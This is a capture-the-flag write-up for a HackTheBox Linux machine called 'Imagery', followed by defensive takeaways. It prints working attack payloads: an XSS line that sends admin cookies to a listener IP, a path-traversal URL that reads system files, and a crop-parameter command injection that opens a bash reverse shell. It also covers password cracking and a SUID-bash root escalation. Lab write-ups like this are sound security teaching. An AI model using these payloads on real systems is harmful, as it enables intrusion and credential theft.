@@ -1,0 +1,142 @@
+Title: Imagery
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Imagery was a Linux box built around a Flask/Werkzeug "Image Gallery" web app. A stored XSS in the app's bug-report feature was used to exfiltrate an admin session cookie, which unsigned Flask session cookies allowed decoding and gave access to an admin panel. That panel exposed a path-traversal (LFI) vulnerability in its system log retrieval endpoint, which was used to read application source code, environment variables, and a local JSON "database" file containing password hashes. One cracked password unlocked a test account, and reading the app's source revealed that its image-transform endpoint built ImageMagick `convert` commands via unsanitized string concatenation, giving straightforward OS command injection and a reverse shell as the web service account. From there, a world-readable but AES-encrypted backup archive was pulled off the box, brute forced to find its passphrase, and decrypted to recover another cracked credential pair, which was reused via `su` to become a second local user. That user held a passwordless sudo rule for a custom backup CLI tool, `charcol`, whose interactive shell allowed scheduling a recurring privileged job, ultimately used to set the SUID bit on `bash` and gain a root shell.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.88
+22/tcp   open  ssh
+8000/tcp open  http-alt
+
+> nmap -sC -sV -p22,8000 10.10.11.88
+22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
+|_http-title: Image Gallery
+```
+
+Port 8000 hosted an "Image Gallery" app with login, registration, and image upload. An email address on the site (`support@imagery.com`) hinted at the intended domain naming.
+
+## Session Hijack via Stored XSS
+
+The app's bug-report feature reflected submitted content without sanitization, allowing a stored XSS payload that exfiltrated the viewing user's cookie to an attacker-controlled listener:
+
+```html
+<img src=x onerror="fetch('http://10.10.15.54:7575/log?c='+document.cookie)">
+```
+
+Once an administrator viewed the report, their session cookie arrived at the listener. Flask signs its session cookies but does not encrypt them by default, so `flask-unsign` could decode the captured cookie without needing the app's secret key, revealing the session contents:
+
+```
+{'displayId': 'a1b2c3d4', 'isAdmin': True, 'username': 'admin@imagery.htb', ...}
+```
+
+Applying this cookie in the browser and navigating to the app's admin panel confirmed admin access, and the panel listed both `admin@imagery.htb` and a `testuser@imagery.htb` account.
+
+## LFI in Admin Log Retrieval
+
+The admin panel's system log viewer took a `log_identifier` parameter and concatenated it directly into a file path without sanitizing directory traversal sequences:
+
+```
+http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd
+```
+
+This confirmed local file read as an admin-authenticated request. Reading `/proc/self/cmdline` and `/proc/self/environ` identified the running Flask app's install path and revealed an environment variable of note:
+
+```
+CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!
+```
+
+Pulling the application's own source files (`app.py`, `config.py`) through the same LFI confirmed this token backed a header-based lockout bypass (`X-Bypass-Lockout`), and `config.py` also pointed to the app's data store, `db.json`, and the ImageMagick/ExifTool binaries used for image processing. Reading `db.json` through the LFI exposed stored password hashes, one of which cracked to a usable password:
+
+```
+testuser@imagery.htb : iambatman
+```
+
+## Foothold - Command Injection in Image Transform Endpoint
+
+Public exploits for known ImageMagick and ExifTool CVEs were tried against the upload/processing pipeline without success. Reading `api_edit.py` through the LFI showed why a more direct route existed: the image "crop" transform built its `convert` command by directly interpolating user-supplied `x`, `y`, `width`, and `height` values into a shell string, then executed it with `shell=True`:
+
+```python
+command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
+subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
+```
+
+Logged in as the cracked `testuser` account, and with the recovered lockout-bypass token set as an `X-Bypass-Lockout` header, a crafted crop request was sent with a shell payload injected into the `x` parameter:
+
+```json
+{
+  "imageId": "623ac95c-acdd-4033-997c-43a802786320",
+  "transformType": "crop",
+  "params": {
+    "x": "0; /bin/bash -c 'bash -i >& /dev/tcp/10.10.15.54/443 0>&1';",
+    "y": 0,
+    "width": 940,
+    "height": 529
+  }
+}
+```
+
+Submitting this to the transform endpoint caught a reverse shell as the web service account (`web`), later upgraded to a full TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+
+## Credential Harvesting - Encrypted Backup Archive
+
+Reviewing the application further as `web` turned up a hardcoded password inside `bot/admin.py`. Separately, a world-readable but root-owned backup archive was found under `/var/backup/`:
+
+```
+web_20250806_120723.zip.aes
+```
+
+The file was transferred off the box with netcat and identified as AES-encrypted data produced by `pyAesCrypt`. Since `pyAesCrypt` archives can be brute forced offline, a custom brute-forcing script for the format was used against rockyou.txt, and the passphrase (`bestfriends`) turned up within the first few lines of the wordlist. Decrypting and extracting the archive recovered a copy of the web application's source and data, including two additional password hashes in a bundled `db.json`. One cracked to:
+
+```
+mark@imagery.htb : supersmash
+```
+
+## Lateral Movement - su as mark
+
+From the `web` shell, switching to the `mark` account with the recovered password succeeded, granting access to the user flag.
+
+```
+web@imagery:~$ su mark
+```
+
+## Privilege Escalation - Sudo Charcol Task Scheduling
+
+Checking `sudo -l` as `mark` showed a passwordless sudo rule for a custom backup utility:
+
+```
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol
+```
+
+The binary itself was only executable by root directly, so it had to be run through sudo. `charcol` ("Charcol - The Backup Suite") is a small CLI tool with its own interactive shell mode, launched with `sudo /usr/local/bin/charcol shell`. Inside that shell, an `auto add` command supports scheduling a recurring job on a cron-style interval, and since the tool itself runs as root under sudo, any command scheduled through it also executes as root. Scheduling a job to set the SUID bit on bash was enough to escalate:
+
+```
+charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "SystemUpgrade"
+```
+
+After waiting roughly a minute for the scheduled job to fire, `/bin/bash` carried the SUID bit, and spawning it with the `-p` flag (to preserve privileges rather than dropping them) produced a root shell:
+
+```
+mark@imagery:~$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1474768 Oct 26 2024 /bin/bash
+mark@imagery:~$ /bin/bash -p
+bash-5.1# whoami
+root
+```
+
+From there, `/root/root.txt` was readable, completing the box.
+
+## Takeaways
+
+- Stored XSS against a page reviewed by a privileged user is still one of the most reliable ways to hijack an admin session, especially against apps using unsigned or predictably signed session cookies that can be decoded offline with tools like `flask-unsign`.
+- Admin-only endpoints are not automatically safe from path traversal just because they require authentication; an LFI behind an admin panel is often more damaging than one on a public endpoint, since it tends to expose more sensitive application internals.
+- Reading an application's own source code through an LFI is worth doing systematically. Config files, environment dumps, and data stores frequently reveal hardcoded secrets, bypass tokens, and hashed credentials that a black-box test would otherwise miss entirely.
+- Building shell commands (such as ImageMagick `convert` invocations) by directly interpolating user-supplied numeric or dimension parameters into a string, then executing with `shell=True`, is a straightforward OS command injection vector regardless of how unlikely those fields seem to need sanitization.
+- Backup archives left world-readable, even when encrypted, are worth pulling and attacking offline. Weak or dictionary-crackable passphrases on tools like `pyAesCrypt` can turn an encrypted archive into another set of valid credentials.
+- Custom, in-house administrative tools granted through passwordless sudo rules deserve the same scrutiny as any known binary: an interactive shell or scheduling feature inside such a tool, running as root via sudo, is a direct path to arbitrary root code execution once any of its features can run attacker-influenced commands.
